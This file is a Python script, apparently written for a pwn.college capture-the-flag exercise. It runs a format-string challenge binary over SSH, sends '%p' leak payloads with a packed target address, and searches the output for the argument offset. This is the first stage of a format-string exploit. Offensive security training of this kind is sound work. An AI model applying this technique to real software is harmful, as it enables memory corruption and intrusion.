import subprocess
import struct

ADDR = 0x4040E0
SSH = [
    "ssh",
    "-i",
    "../key",
    "hacker@dojo.pwn.college",
    "/challenge/babyfmt_level4.1",
]

fmt = ("AAA " + "%p " * 80).encode()

for pad in range(8):
    payload = fmt + b"A" * pad + struct.pack("<Q", ADDR)

    res = subprocess.run(SSH, input=payload, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    out = res.stdout.decode("latin-1", errors="ignore")

    line = None
    for l in out.splitlines():
        if l.startswith("AAA "):
            line = l
            break

    print(f"pad {pad}")
    if line:
        parts = line.split()[1:]
        found = False
        for idx, token in enumerate(parts, start=1):
            if token.lower() == "0x4040e0":
                print("index", idx)
                found = True
                break
        if not found:
            print("no exact pointer; sample tail:", parts[-5:])
    else:
        print("No AAA line detected")
